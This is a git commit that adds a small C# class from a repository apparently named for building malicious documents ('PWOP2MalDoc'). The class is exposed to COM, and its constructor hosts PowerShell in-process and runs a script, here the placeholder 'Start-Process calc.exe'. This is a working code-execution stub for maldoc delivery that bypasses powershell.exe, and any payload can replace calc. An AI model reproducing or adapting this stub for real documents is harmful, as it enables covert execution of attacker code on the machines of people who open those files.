838f08568724b47ca1c178a4b8444fc879d6a232
Mosaab_Al.Haddad <83049555+MalwareDaddy@users.noreply.github.com>
2022-04-01 04:33:39 +0300

    Add files via upload

---
+++ PWOP2MalDoc/PWOP/PWOP/PWOP.cs
@@ -0,0 +1,23 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Management.Automation;
+using System.Collections.ObjectModel;
+
+namespace PWOP
+{
+    [ComVisible(true)]
+    public class PWOP
+    {
+        public PWOP () {
+        PowerShell ps1 = PowerShell.Create();
+        ps1.AddScript("Start-Process calc.exe");
+        ps1.Invoke();
+        }
+    }
+}
+
+
